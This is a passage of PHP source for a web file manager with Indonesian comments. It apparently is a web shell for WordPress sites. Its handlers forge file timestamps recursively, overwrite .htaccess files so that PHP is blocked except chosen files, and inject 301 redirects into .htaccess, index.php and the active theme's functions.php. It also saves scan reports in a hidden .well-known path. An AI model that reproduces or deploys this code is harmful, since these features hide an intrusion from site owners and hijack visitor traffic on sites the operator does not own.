        return false;
    }
    if (!is_readable($rootDir)) {
        $errors[] = 'Folder root tidak bisa dibaca (permission): ' . $rootDir;
        return false;
    }

    @set_time_limit(180);
    @ignore_user_abort(true);

    $maxDirs      = 4000;
    $maxResults   = 600;
    $maxFileSize  = 1024*1024; // 1MB untuk content search
    $searchableExt = [
        'php','php3','php4','php5','php7','php8','phtml',
        'inc','html','htm','txt','js','css','env','ini','conf','log','xml','json'
    ];

    // Jika filter ekstensi diberikan, batasi hanya ekstensi tersebut
    if (!empty($filters['extensions']) && is_array($filters['extensions'])) {
        $searchableExt = array_intersect($searchableExt, $filters['extensions']);
    }

    $flags = FilesystemIterator::SKIP_DOTS;
    $it    = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($rootDir, $flags),
        RecursiveIteratorIterator::SELF_FIRST,
        RecursiveIteratorIterator::CATCH_GET_CHILD
    );

    $docRoot = rtrim($_SERVER['DOCUMENT_ROOT'], DIRECTORY_SEPARATOR);

    // Untuk filter tanggal
    $dateFrom = isset($filters['date_from']) ? (int)$filters['date_from'] : 0;
    $dateTo   = isset($filters['date_to']) ? (int)$filters['date_to'] : PHP_INT_MAX;

    foreach ($it as $info) {
        /** @var SplFileInfo $info */
        $path = $info->getPathname();

        if ($info->isDir()) {
            $stats['dirs']++;

            if ($nameKeyword !== '') {
                $match = false;
                if ($filters['use_regex'] ?? false) {
                    $match = @preg_match('/' . $nameKeyword . '/i', $info->getFilename());
                } else {
                    $match = (stripos($info->getFilename(), $nameKeyword) !== false);
                }
                if ($match) {
                    $rel = str_replace($docRoot, '', $path);
                    if ($rel === '') $rel = $path;
                    $results[] = [
                        'type' => 'name',
                        'kind' => 'dir',
                        'path' => $rel,
                        'full' => $path,
                    ];
                    $stats['nameMatches']++;
                }
            }

            if ($stats['dirs'] > $maxDirs) {
                $stats['stoppedByLimit'] = true;
                $errors[] = "Scan dihentikan otomatis setelah melewati {$maxDirs} folder.";
                break;
            }

            continue;
        }

        if (!$info->isFile()) {
            continue;
        }
        $stats['files']++;

        $name     = $info->getFilename();
        $fullpath = $path;
        $rel      = str_replace($docRoot, '', $fullpath);
        if ($rel === '') $rel = $fullpath;

        // Filter ekstensi
        $ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
        if (!empty($filters['extensions']) && !in_array($ext, $filters['extensions'])) {
            continue;
        }

        // Filter ukuran
        $size = $info->getSize();
        if (isset($filters['min_size']) && $size < $filters['min_size']) continue;
        if (isset($filters['max_size']) && $size > $filters['max_size']) continue;

        // Filter tanggal
        $mtime = $info->getMTime();
        if ($mtime < $dateFrom || $mtime > $dateTo) continue;

        if ($nameKeyword !== '') {
            $match = false;
            if ($filters['use_regex'] ?? false) {
                $match = @preg_match('/' . $nameKeyword . '/i', $name);
            } else {
                $match = (stripos($name, $nameKeyword) !== false);
            }
            if ($match) {
                $results[] = [
                    'type' => 'name',
                    'kind' => 'file',
                    'path' => $rel,
                    'full' => $fullpath,
                ];
                $stats['nameMatches']++;
            }
        }

        if ($contentKeyword !== '') {
            if (!in_array($ext, $searchableExt, true)) {
                // lewati
            } else {
                if ($size <= $maxFileSize && @is_readable($fullpath)) {
                    $lines = @file($fullpath, FILE_IGNORE_NEW_LINES);
                    if ($lines !== false) {
                        $matchesLines = [];
                        foreach ($lines as $lnum => $line) {
                            $match = false;
                            if ($filters['use_regex'] ?? false) {
                                $match = @preg_match('/' . $contentKeyword . '/i', $line);
                            } else {
                                $match = (stripos($line, $contentKeyword) !== false);
                            }
                            if ($match) {
                                $matchesLines[] = [
                                    'line'    => $lnum + 1,
                                    'snippet' => trim($line),
                                ];
                                if (count($matchesLines) >= 5) break;
                            }
                        }

                        if ($matchesLines) {
                            $results[] = [
                                'type'  => 'content',
                                'kind'  => 'file',
                                'path'  => $rel,
                                'full'  => $fullpath,
                                'lines' => $matchesLines,
                            ];
                            $stats['contentMatches']++;
                        }
                    }
                }
            }
        }

        if (count($results) >= $maxResults) {
            $stats['stoppedByLimit'] = true;
            $errors[] = "Hasil lebih dari {$maxResults} entri. Ditampilkan sebagian saja.";
            break;
        }
    }

    return true;
}

// Handler pencarian (dengan filter tambahan)
if (isset($_POST['runSearch'])) {
    $searchRoot = isset($_POST['search_root']) ? trim($_POST['search_root']) : '';
    $nameQ      = isset($_POST['search_name']) ? trim($_POST['search_name']) : '';
    $contentQ   = isset($_POST['search_content']) ? trim($_POST['search_content']) : '';
    $useRegex   = isset($_POST['search_regex']) ? true : false;
    $extensions = isset($_POST['search_extensions']) ? array_map('trim', explode(',', $_POST['search_extensions'])) : [];
    $minSize    = isset($_POST['search_min_size']) ? (int)$_POST['search_min_size'] * 1024 : 0; // dalam KB
    $maxSize    = isset($_POST['search_max_size']) ? (int)$_POST['search_max_size'] * 1024 : 0;
    $dateFrom   = isset($_POST['search_date_from']) ? strtotime($_POST['search_date_from']) : 0;
    $dateTo     = isset($_POST['search_date_to']) ? strtotime($_POST['search_date_to']) : PHP_INT_MAX;

    if ($searchRoot === '') {
        if (!empty($_GET['folder'])) {
            $searchRoot = sanitizePath($_GET['folder']);
        } else {
            $searchRoot = $rootDirectory;
        }
    } else {
        $searchRoot = sanitizePath($searchRoot);
    }

    $filters = [
        'use_regex'   => $useRegex,
        'extensions'  => $extensions,
        'min_size'    => $minSize,
        'max_size'    => $maxSize,
        'date_from'   => $dateFrom,
        'date_to'     => $dateTo,
    ];

    $results = [];
    $stats   = [];
    $errors  = [];

    $ok = fm_search_scan_advanced($searchRoot, $nameQ, $contentQ, $filters, $results, $stats, $errors);

    if ($errors) {
        $_SESSION['search_status'] = ($ok && ($stats['nameMatches'] || $stats['contentMatches'])) ? 'partial' : 'error';
        $_SESSION['search_message'] = implode(" \n", $errors);
    } else {
        $_SESSION['search_status'] = 'success';
        $_SESSION['search_message'] =
            "Search selesai.\n" .
            "Root: {$searchRoot}\n" .
            "Match nama: " . (int)((isset($stats['nameMatches']) ? $stats['nameMatches'] : 0)) . ", match isi file: " . (int)((isset($stats['contentMatches']) ? $stats['contentMatches'] : 0)) . ".\n" .
            "Folder discan: " . (int)((isset($stats['dirs']) ? $stats['dirs'] : 0)) . ", file discan: " . (int)((isset($stats['files']) ? $stats['files'] : 0)) . ".";
    }

    $_SESSION['search_results'] = $results;
    $_SESSION['search_stats']   = $stats;
    $_SESSION['search_root']    = $searchRoot;
    $_SESSION['search_name']    = $nameQ;
    $_SESSION['search_content'] = $contentQ;

    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// =====================================================================
// BAGIAN 5: FUNGSI-FUNGSI LAINNYA (REDIRECT, SYNC TIMESTAMP, SCAN HTACCESS, DEPLOY, DLL)
// =====================================================================

// === REPLACE HTACCESS HELPER & HANDLER ===
function write_htaccess_with_backup($targetDir, $contents, &$errors) {
    $targetDir = rtrim($targetDir, DIRECTORY_SEPARATOR);
    if (!is_dir($targetDir)) { $errors[] = "Folder tidak ditemukan: {$targetDir}"; return false; }
    if (!is_writable($targetDir)) { @chmod($targetDir, 0777); }
    if (!is_writable($targetDir)) { $errors[] = "Folder tidak writable: {$targetDir}"; return false; }

    $ht = $targetDir . DIRECTORY_SEPARATOR . '.htaccess';
    if (file_exists($ht) && is_writable($ht)) {
        @rename($ht, $ht . '.bak_' . date('Ymd_His'));
    }
    $ok = @file_put_contents($ht, $contents);
    if ($ok === false) { $errors[] = "Gagal menulis .htaccess di {$targetDir}"; return false; }
    return true;
}

function resolve_inside_docroot_dir($rawPath, &$errors) {
    $rawPath = trim(sanitizePath($rawPath));
    if ($rawPath === '') { $errors[] = "Path custom kosong."; return null; }

    if ($rawPath[0] !== DIRECTORY_SEPARATOR) {
        $abs = rtrim($_SERVER['DOCUMENT_ROOT'], DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . ltrim($rawPath, DIRECTORY_SEPARATOR);
    } else {
        $abs = $rawPath;
    }

    $real = @realpath($abs);
    if ($real === false) { $real = $abs; }
    if (!is_dir($real)) { $errors[] = "Path custom bukan folder yang valid: {$rawPath}"; return null; }

    $doc = @realpath($_SERVER['DOCUMENT_ROOT']);
    if (!$doc || strpos($real, $doc) !== 0) { $errors[] = "Path custom harus di dalam Document Root."; return null; }

    return $real;
}

if (isset($_POST['doHtaccessReplace'])) {
    // Hanya admin yang boleh mengganti .htaccess
    if (!$isAdmin) {
        $_SESSION['error'] = 'Hanya admin yang dapat mengganti .htaccess.';
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }

    $tpl_includes = <<<'HTA'
Options -Indexes

<IfModule mod_rewrite.c>
  RewriteEngine On
  RewriteRule ^ms-files\.php$ - [L]
  RewriteRule \.(?:php(?:[0-9]+(?:\.[0-9]+)?)?|phtml?|phar|phps)(?:\..*)?$ - [F,L,NC]
</IfModule>

<FilesMatch "(?i)\.(?:php(?:[0-9]+(?:\.[0-9]+)?)?|phtml?|phar|phps)(?:\..*)?$">
  Require all denied
</FilesMatch>

<IfModule !mod_authz_core.c>
  <FilesMatch "(?i)\.(?:php(?:[0-9]+(?:\.[0-9]+)?)?|phtml?|phar|phps)(?:\..*)?$">
    Order allow,deny
    Deny from all
  </FilesMatch>
HTA;

    $tpl_content = <<<'HTA'
<IfModule mod_rewrite.c>
  RewriteEngine On
  RewriteCond %{REQUEST_URI} \.(?:css|js|map|png|jpe?g|gif|svg|webp|ico|bmp|tiff|mp4|webm|m4v|mp3|m4a|ogg|oga|ogv|wav|pdf|docx?|xlsx?|pptx?|csv|txt|vtt|woff2?|otf|eot|html)$ [NC]
  RewriteRule ^ - [L]
  RewriteRule ^ - [F]
</IfModule>
HTA;

    $tpl_custom_allow = <<<'HTA'
<FilesMatch ".*">
    Order Allow,Deny
    Allow from all
</FilesMatch>

<IfModule mod_authz_core.c>
    <FilesMatch ".*">
        Require all granted
    </FilesMatch>
</IfModule>

Options -Indexes
HTA;

    $tpl_custom_deny = <<<'HTA'
Options -ExecCGI

<IfModule mod_authz_core.c>
  <FilesMatch "(?i)\.(php[0-9]*|phtml|pht|phar|phps)$">
    Require all denied
  </FilesMatch>
</IfModule>

<IfModule !mod_authz_core.c>
  <FilesMatch "(?i)\.(php[0-9]*|phtml|pht|phar|phps)$">
    Order allow,deny
    Deny from all
  </FilesMatch>
</IfModule>
HTA;

    $okTargets = [];
    $errors = [];

    if (!empty($_POST['replaceIncludes'])) {
        $dir = rtrim($_SERVER['DOCUMENT_ROOT'], DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . 'wp-includes';
        if (write_htaccess_with_backup($dir, $tpl_includes, $errors)) {
            $okTargets[] = '/wp-includes';
        }
    }
    if (!empty($_POST['replaceContent'])) {
        $dir = rtrim($_SERVER['DOCUMENT_ROOT'], DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . 'wp-content';
        if (write_htaccess_with_backup($dir, $tpl_content, $errors)) {
            $okTargets[] = '/wp-content';
        }
    }
    if (!empty($_POST['replaceCustom'])) {
        $mode = (isset($_POST['customMode']) && $_POST['customMode'] === 'deny') ? 'deny' : 'allow';
        $customDir = resolve_inside_docroot_dir((isset($_POST['customPath']) ? $_POST['customPath'] : ''), $errors);
        if ($customDir) {
            $tpl = ($mode === 'deny') ? $tpl_custom_deny : $tpl_custom_allow;
            if (write_htaccess_with_backup($customDir, $tpl, $errors)) {
                $okTargets[] = str_replace($_SERVER['DOCUMENT_ROOT'], '', $customDir) ?: '/';
            }
        }
    }

    if ($okTargets) {
        $_SESSION['htreplace_status']  = 'success';
        $_SESSION['htreplace_message'] = 'Berhasil replace .htaccess pada: ' . htmlspecialchars(implode(', ', $okTargets));
    } else {
        $_SESSION['htreplace_status']  = 'error';
        $_SESSION['htreplace_message'] = 'Tidak ada .htaccess yang diganti.' . ($errors ? ' (' . implode(' | ', array_map('htmlspecialchars', $errors)) . ')' : '');
    }

    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// === SYNC TIMESTAMP ===
function _resolve_inside_docroot_any($rawPath, &$errors) {
    $rawPath = trim(sanitizePath($rawPath));
    if ($rawPath === '') { $errors[] = "Path kosong."; return null; }

    $isAbsolute = ($rawPath[0] === DIRECTORY_SEPARATOR) || preg_match('/^[A-Za-z]:[\\\\\\/]/', $rawPath);
    $abs = $isAbsolute
        ? $rawPath
        : rtrim($_SERVER['DOCUMENT_ROOT'], DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . ltrim($rawPath, DIRECTORY_SEPARATOR);

    $real = @realpath($abs);
    if ($real === false) $real = $abs;

    if ($real === DIRECTORY_SEPARATOR) { $errors[] = "Menolak path root sistem ('/')."; return null; }

    if (!file_exists($real)) { $errors[] = "Path tidak ditemukan: {$rawPath}"; return null; }

    return $real;
}

// === SYNC TIMESTAMP (Manual Date/Time) ===
if (isset($_POST['doSyncTimestamp'])) {
    // Izin: admin atau teman
    if (!$isAdmin && !$isTeman) {
        $_SESSION['error'] = 'Anda tidak memiliki izin.';
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }

    $errors = [];
    $targetRaw = isset($_POST['ts_target']) ? trim($_POST['ts_target']) : '';
    $dateStr   = isset($_POST['ts_date']) ? trim($_POST['ts_date']) : '';
    $timeStr   = isset($_POST['ts_time']) ? trim($_POST['ts_time']) : '';
    $recursive = !empty($_POST['ts_recursive']);

    // Validasi input
    if (empty($targetRaw)) {
        $errors[] = 'Target path harus diisi.';
    }
    if (empty($dateStr) || empty($timeStr)) {
        $errors[] = 'Tanggal dan jam harus diisi.';
    }

    // Gabung tanggal dan jam, lalu konversi ke timestamp
    $datetimeStr = $dateStr . ' ' . $timeStr;
    $timestamp = strtotime($datetimeStr);
    if ($timestamp === false) {
        $errors[] = 'Format tanggal/jam tidak valid.';
    }

    // Resolve path target (harus di dalam DOCUMENT_ROOT)
    $target = null;
    if (empty($errors)) {
        $target = _resolve_inside_docroot_any($targetRaw, $errors);
    }

    // Jika ada error, simpan dan redirect
    if (!empty($errors)) {
        $_SESSION['ts_status'] = 'error';
        $_SESSION['ts_message'] = 'Gagal: ' . htmlspecialchars(implode(' | ', $errors));
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }

    // Set time limit untuk proses besar
    @set_time_limit(180);
    @ini_set('memory_limit', '-1');
    @ignore_user_abort(true);

    // Statistik
    $filesTouched = 0;
    $dirsTouched  = 0;
    $errList      = [];
    $maxErrInMem  = 200;
    $processed    = 0;
    $maxProcessed = 50000;

    // Fungsi touch dengan timestamp yang ditentukan
    $doTouch = function($p) use ($timestamp, &$filesTouched, &$dirsTouched, &$errList, $maxErrInMem) {
        if (!@is_writable($p)) {
            if (count($errList) < $maxErrInMem) $errList[] = "Not writable: {$p}";
            @error_log("timestamp-sync: not writable -> {$p}");
            return;
        }
        // Set mtime dan atime sama dengan timestamp
        if (@touch($p, $timestamp, $timestamp)) {
            if (is_dir($p)) $dirsTouched++; else $filesTouched++;
        } else {
            if (count($errList) < $maxErrInMem) $errList[] = "Gagal touch: {$p}";
            @error_log("timestamp-sync: touch failed -> {$p}");
        }
    };

    // Proses target
    if (is_dir($target) && $recursive) {
        // Daftar folder yang akan dilewati (sama seperti sebelumnya)
        $skip = ['node_modules','vendor','.git','cache','tmp','logs','wp-content/uploads'];

        $it = new \RecursiveIteratorIterator(
            new \RecursiveCallbackFilterIterator(
                new \RecursiveDirectoryIterator($target, \FilesystemIterator::SKIP_DOTS),
                function (\SplFileInfo $info) use ($skip) {
                    $name = $info->getFilename();
                    if ($info->isDir()) {
                        foreach ($skip as $s) {
                            if (strcasecmp($name, $s) === 0) return false;
                        }
                    }
                    return !$info->isLink();
                }
            ),
            \RecursiveIteratorIterator::SELF_FIRST
        );

        $dirs = [];
        foreach ($it as $path => $info) {
            if (++$processed > $maxProcessed) { 
                @error_log("timestamp-sync: processed limit {$processed} reached, stopping early.");
                break; 
            }
            if ($info->isDir()) {
                $dirs[] = $path;
                continue;
            }
            $doTouch($path);
        }
        // Urutkan direktori dari yang terdalam agar parent terakhir
        usort($dirs, function($a, $b) {
            $la = strlen($a);
            $lb = strlen($b);
            if ($la == $lb) return 0;
            return ($la < $lb) ? 1 : -1;
        });
        foreach ($dirs as $d) {
            if (++$processed > $maxProcessed) break;
            $doTouch($d);
        }
    } else {
        $doTouch($target);
    }

    // Susun pesan hasil
    $msg = "SUKSES mengubah timestamp.\n".
           "Target: {$target}\n".
           "Timestamp diset ke: " . date('Y-m-d H:i:s', $timestamp) . "\n".
           "Tersentuh: {$filesTouched} file, {$dirsTouched} direktori";
    if ($processed > $maxProcessed) {
        $msg .= "\nCatatan: pemrosesan dibatasi pada {$maxProcessed} entri untuk mencegah timeout.";
    }
    if (!empty($errList)) {
        $slice = array_slice($errList, 0, 10);
        $msg .= "\nPERINGATAN (" . count($errList) . " ditampilkan maks 10): " . implode(' | ', array_map('htmlspecialchars', $slice));
    }

    $_SESSION['ts_status']  = empty($errList) ? 'success' : 'partial';
    $_SESSION['ts_message'] = nl2br($msg);

    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// === HELPER: PARSE INPUT URL/PATH UNTUK REDIRECT 301 ===
function fm_parse_redirect_source($raw, &$isHome, &$path) {
    $raw = trim((string)$raw);

    $isHome = false;
    $path   = '/';

    if ($raw === '') {
        $isHome = true;
        $path   = '/';
        return;
    }

    $clean = preg_replace('#^https?://[^/]+#i', '', $raw);
    $clean = trim($clean);

    if ($clean === '' || $clean === '/' || strtolower($clean) === 'homepage') {
        $isHome = true;
        $path   = '/';
        return;
    }

    if ($clean[0] !== '/') $clean = '/'.$clean;

    $onlyPath = parse_url($clean, PHP_URL_PATH);
    if (!$onlyPath) $onlyPath = $clean;

    $isHome = ($onlyPath === '/' || $onlyPath === '/index.php');
    $path   = $onlyPath;
}

/// === HANDLER: BUAT REDIRECT 301 ===
if (isset($_POST['runRedirect301'])) {
    // Hanya admin yang boleh membuat redirect (menulis file)
    if (!$isAdmin) {
        $_SESSION['error'] = 'Hanya admin yang dapat membuat redirect 301.';
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }

    $targetType  = isset($_POST['redirect_target_type']) ? $_POST['redirect_target_type'] : '';
    $sourceRaw   = isset($_POST['redirect_source']) ? $_POST['redirect_source'] : '';
    $userTarget  = isset($_POST['redirect_target_url']) ? trim($_POST['redirect_target_url']) : '';
    $redirectTo  = $userTarget !== '' ? $userTarget : $redirectTargetDefault;
    $errors      = [];
    $targetLabel = '';

    $sourceRaw = trim((string)$sourceRaw);
    if ($sourceRaw === '') {
        $errors[] = 'URL/path yang akan di-redirect wajib diisi.';
    }

    if ($redirectTo === '') {
        $errors[] = 'URL tujuan redirect wajib diisi.';
    } elseif (!filter_var($redirectTo, FILTER_VALIDATE_URL)) {
        $errors[] = 'URL tujuan redirect tidak valid.';
    }

    $isHome = false;
    $path   = '/';
    if (!$errors) {
        fm_parse_redirect_source($sourceRaw, $isHome, $path);
    }

    if (!$errors) {
         if ($targetType === 'htaccess') {
            $targetLabel = '.htaccess (Document Root)';

            $docRoot = rtrim($_SERVER['DOCUMENT_ROOT'], DIRECTORY_SEPARATOR);
            $ht      = $docRoot . DIRECTORY_SEPARATOR . '.htaccess';

            $existing = '';
            if (file_exists($ht)) {
                $existing = @file_get_contents($ht);
                if ($existing === false) {
                    $errors[] = 'Gagal membaca .htaccess.';
                }
            }

            if (!$errors) {
                $hasRewriteEngine = stripos($existing, 'RewriteEngine On') !== false;

                $snippet = '';

                if (!$hasRewriteEngine) {
                    $snippet .= "RewriteEngine On\n\n";
                }

                if ($isHome) {
                    $snippet .= "RewriteRule ^$ {$redirectTo} [R=301,L]\n";
                } else {
                    $pattern = trim($path, '/');
                    $pattern = preg_quote($pattern, '#');
                    $snippet .= "RewriteRule ^{$pattern}/?$ {$redirectTo} [R=301,L]\n";
                }

                $posBegin = stripos($existing, '# BEGIN WordPress');

                if ($posBegin !== false) {
                    $before     = substr($existing, 0, $posBegin);
                    $after      = substr($existing, $posBegin);
                    $newContent = rtrim($before, "\r\n")
                                . "\n\n"
                                . $snippet
                                . "\n"
                                . ltrim($after, "\r\n");
                } else {
                    $newContent = rtrim($existing, "\r\n") . "\n\n" . $snippet;
                }

                if (@file_put_contents($ht, $newContent) === false) {
                    $errors[] = 'Gagal menulis .htaccess.';
                }
            }

        } elseif ($targetType === 'index') {
            $targetLabel = 'index.php (Document Root)';

            $docRoot = rtrim($_SERVER['DOCUMENT_ROOT'], DIRECTORY_SEPARATOR);
            $file    = $docRoot . DIRECTORY_SEPARATOR . 'index.php';

            if (!file_exists($file)) {
                $errors[] = 'index.php tidak ditemukan di Document Root.';
            } else {
                $src = @file_get_contents($file);
                if ($src === false) {
                    $errors[] = 'Gagal membaca index.php.';
                } else {
                    if (strpos($src, '// 301 redirect (File Manager)') !== false) {
                        $errors[] = 'Redirect 301 dari File Manager sudah pernah ditambahkan ke index.php.';
                    } else {
                        $snippet  = "\n// 301 redirect (File Manager)\n";
                        $snippet .= "if (php_sapi_name() !== 'cli') {\n";
                        $snippet .= "    \$reqUri = isset(\$_SERVER['REQUEST_URI']) ? \$_SERVER['REQUEST_URI'] : '/';\n";
                        $snippet .= "    \$path = parse_url(\$reqUri, PHP_URL_PATH);\n";
                        $snippet .= "    if (!\$path) { \$path = '/'; }\n";

                        if ($isHome) {
                            $snippet .= "    if (\$path === '/' || \$path === '/index.php') {\n";
                        } else {
                            $p1 = $path;
                            $p2 = rtrim($path, '/');
                            if ($p2 === '') $p2 = '/';
                            $snippet .= "    if (\$path === '".addslashes($p1)."' || \$path === '".addslashes($p2)."') {\n";
                        }

                        $snippet .= "        header('Location: {$redirectTo}', true, 301);\n";
                        $snippet .= "        exit;\n";
                        $snippet .= "    }\n";
                        $snippet .= "}\n";

                        $pos = strpos($src, '<?php');
                        if ($pos === false) {
                            $new = "<?php\n{$snippet}\n?>\n" . $src;
                        } else {
                            $posEnd = $pos + 5;
                            $new    = substr($src, 0, $posEnd) . "\n{$snippet}\n" . substr($src, $posEnd);
                        }

                        if (@file_put_contents($file, $new) === false) {
                            $errors[] = 'Gagal menulis index.php.';
                        }
                    }
                }
            }

        } elseif ($targetType === 'theme') {
            $targetLabel = 'functions.php Theme Aktif';

            $docRoot = rtrim($_SERVER['DOCUMENT_ROOT'], DIRECTORY_SEPARATOR);
            $wpLoad  = $docRoot . DIRECTORY_SEPARATOR . 'wp-load.php';

            if (!file_exists($wpLoad)) {
                $errors[] = 'wp-load.php tidak ditemukan. Tidak bisa otomatis mendeteksi theme.';
            } else {
                require_once $wpLoad;

                if (!function_exists('get_stylesheet_directory')) {
                    $errors[] = 'Fungsi get_stylesheet_directory() tidak tersedia.';
                } else {
                    $themeDir  = rtrim(get_stylesheet_directory(), DIRECTORY_SEPARATOR);
                    $funcFile  = $themeDir . DIRECTORY_SEPARATOR . 'functions.php';

                    if (!file_exists($funcFile)) {
                        $errors[] = 'functions.php theme aktif tidak ditemukan.';
                    } else {
                        $src = @file_get_contents($funcFile);
                        if ($src === false) {
                            $errors[] = 'Gagal membaca functions.php theme.';
                        } else {
                            if (strpos($src, '// 301 redirect (File Manager)') !== false) {
                                $errors[] = 'Redirect 301 dari File Manager sudah pernah ditambahkan ke functions.php.';
                            } else {
                                $snippet  = "\n\n// 301 redirect (File Manager)\n";
                                $snippet .= "add_action('template_redirect', function () {\n";
                                $snippet .= "    \$reqUri = isset(\$_SERVER['REQUEST_URI']) ? \$_SERVER['REQUEST_URI'] : '/';\n";
                                $snippet .= "    \$path = parse_url(\$reqUri, PHP_URL_PATH);\n";
                                $snippet .= "    if (!\$path) { \$path = '/'; }\n";

                                if ($isHome) {
                                    $snippet .= "    if (\$path === '/' || \$path === '/index.php') {\n";
                                } else {
                                    $p1 = $path;
                                    $p2 = rtrim($path, '/');
                                    if ($p2 === '') $p2 = '/';
                                    $snippet .= "    if (\$path === '".addslashes($p1)."' || \$path === '".addslashes($p2)."') {\n";
                                }

                                $snippet .= "        wp_redirect('{$redirectTo}', 301);\n";
                                $snippet .= "        exit;\n";
                                $snippet .= "    }\n";
                                $snippet .= "});\n";

                                $new = $src . $snippet;

                                if (@file_put_contents($funcFile, $new) === false) {
                                    $errors[] = 'Gagal menulis functions.php theme.';
                                }
                            }
                        }
                    }
                }
            }

        } else {
            $errors[] = 'Target file tidak valid. Pilih htaccess / index / theme.';
        }
    }

    if ($errors) {
        $_SESSION['redirect_status']  = 'error';
        $_SESSION['redirect_message'] = 'Gagal membuat redirect: ' . implode(' | ', $errors);
    } else {
        $_SESSION['redirect_status']  = 'success';
        $_SESSION['redirect_message'] = 'Redirect 301 ditambahkan untuk "' .
            htmlspecialchars($sourceRaw, ENT_QUOTES) .
            '" → ' . htmlspecialchars($redirectTo, ENT_QUOTES) .
            ' di ' . $targetLabel . '.';
    }

    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// === FITUR SCAN .htaccess & Folder CHMOD LOCKED ===
// (Scan hanya membaca, tidak mengubah file, jadi tidak perlu pengecekan role)
if (isset($_GET['downloadScan']) && !empty($_SESSION['scan_result_file'])) {
    $f = $_SESSION['scan_result_file'];
    if (file_exists($f)) {
        header('Content-Type: text/html; charset=UTF-8');
        header('Content-Disposition: attachment; filename="'.basename($f).'"');
        header('Content-Length: ' . filesize($f));
        readfile($f);
        @unlink($f);
        unset($_SESSION['scan_result_file']);
        exit;
    } else {
        unset($_SESSION['scan_result_file']);
    }
}

if (
    isset($_POST['scanHtaccess']) ||
    isset($_POST['scanLocked'])   ||
    isset($_POST['scanWpAdmin'])  ||
    isset($_POST['scanWpIncludes'])
) {
    // Scan hanya membaca, semua role bisa menjalankan
    $scanRoot    = $rootDirectory;
    $scanHtaccess= isset($_POST['scanHtaccess']);
    $scanLocked  = isset($_POST['scanLocked']);
    $scanWpAdmin = isset($_POST['scanWpAdmin']);
    $scanWpIncl  = isset($_POST['scanWpIncludes']);

    $versionAdmin = isset($_POST['wpVersionAdmin']) ? trim($_POST['wpVersionAdmin']) : '';
    $versionIncl  = isset($_POST['wpVersionIncludes']) ? trim($_POST['wpVersionIncludes']) : '';

    $lockedModes = [
        '000','001','002','003','004','005','006','007',
        '010','011','012','013','014','015','016','017',
        '111','222','311','400','401','402','403','404',
        '405','406','407','444','555'
    ];

    $sections = [];

    if ($scanHtaccess || $scanLocked) {
        $foundHtaccess = [];
        $foundLocked   = [];

        $scanFn = function($dir) use (&$scanFn, $scanHtaccess, $scanLocked, $lockedModes, $scanRoot, &$foundHtaccess, &$foundLocked) {
            try { $iterator = new DirectoryIterator($dir); } catch (Exception $e) { return; }
            foreach ($iterator as $item) {
                if ($item->isDot()) continue;
                $path = $item->getPathname();
                $rel  = substr($path, strlen($scanRoot));
                if ($scanHtaccess && $item->isFile() && strtolower($item->getFilename()) === '.htaccess') {
                    $foundHtaccess[] = $rel === '' ? '/' : $rel;
                }
                if ($item->isDir()) {
                    if ($scanLocked) {
                        $perm = substr(sprintf('%o', @fileperms($path)), -3);
                        if (in_array($perm, $lockedModes, true)) {
                            $foundLocked[] = ['path' => $rel === '' ? '/' : $rel, 'perm' => $perm];
                        }
                    }
                    $scanFn($path);
                }
            }
        };

        $scanFn($scanRoot);
        $sections[] = format_htaccess_locked_html($scanRoot, $foundHtaccess, $foundLocked);
    }

    if ($scanWpAdmin) {
        try {
            $scan = scan_core_subdir($scanRoot, 'wp-admin', $versionAdmin ?: null, null);
            $sections[] = format_core_scan_html_report($scan);
        } catch (Exception $e) {
            $sections[] = '<section class="report-section"><h2>Core Scan: WP-ADMIN</h2><div class="empty error">ERROR: '.htmlspecialchars($e->getMessage()).'</div></section>';
        }
    }

    if ($scanWpIncl) {
        try {
            $scan = scan_core_subdir($scanRoot, 'wp-includes', $versionIncl ?: null, null);
            $sections[] = format_core_scan_html_report($scan);
        } catch (Exception $e) {
            $sections[] = '<section class="report-section"><h2>Core Scan: WP-INCLUDES</h2><div class="empty error">ERROR: '.htmlspecialchars($e->getMessage()).'</div></section>';
        }
    }

    $scanResultDir = $_SERVER['DOCUMENT_ROOT'] . '/.well-known/acme-challenge/result/';
    if (!is_dir($scanResultDir)) { @mkdir($scanResultDir, 0777, true); }

    $scanFile = $scanResultDir . "scan_result_" . date("Ymd_His") . "_" . rand(111,999) . ".html";

    $now = date('Y-m-d H:i:s');
    $html = <<<HTML
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Laporan Scan File Manager - {$now}</title>
<style>
  :root{
    --bg:#0f1320; --panel:#101426; --ink:#e7eefb; --muted:#b9c4d6;
    --green:#19c37d; --yellow:#ffb400; --red:#ef4444; --line:#223;
  }
  body{margin:0;padding:24px;background:linear-gradient(180deg,var(--bg),#0b0e16);color:var(--ink);font:14px/1.45 system-ui,Segoe UI,Roboto,Arial}
  h1{margin:0 0 16px;font-size:20px}
  h2{margin:0 0 12px;font-size:18px}
  h3{margin:16px 0 8px;font-size:15px;color:var(--muted)}
  .container{max-width:1080px;margin:0 auto}
  .header{background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:16px 18px;margin-bottom:16px}
  .report-section{background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:16px 18px;margin:14px 0}
  .section-desc{color:var(--muted);margin-top:-4px;margin-bottom:10px}
  .grid-cards{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:10px;margin:10px 0 4px}
  .card{background:#0c1120;border:1px solid var(--line);border-radius:10px;padding:10px 12px}
  .stat .k{font-size:12px;color:var(--muted)}
  .stat .v{font-size:18px;font-weight:700}
  .stat.ok .v{color:var(--green)}
  .stat.warn .v{color:var(--yellow)}
  .stat.info .v{color:#7aa2ff}
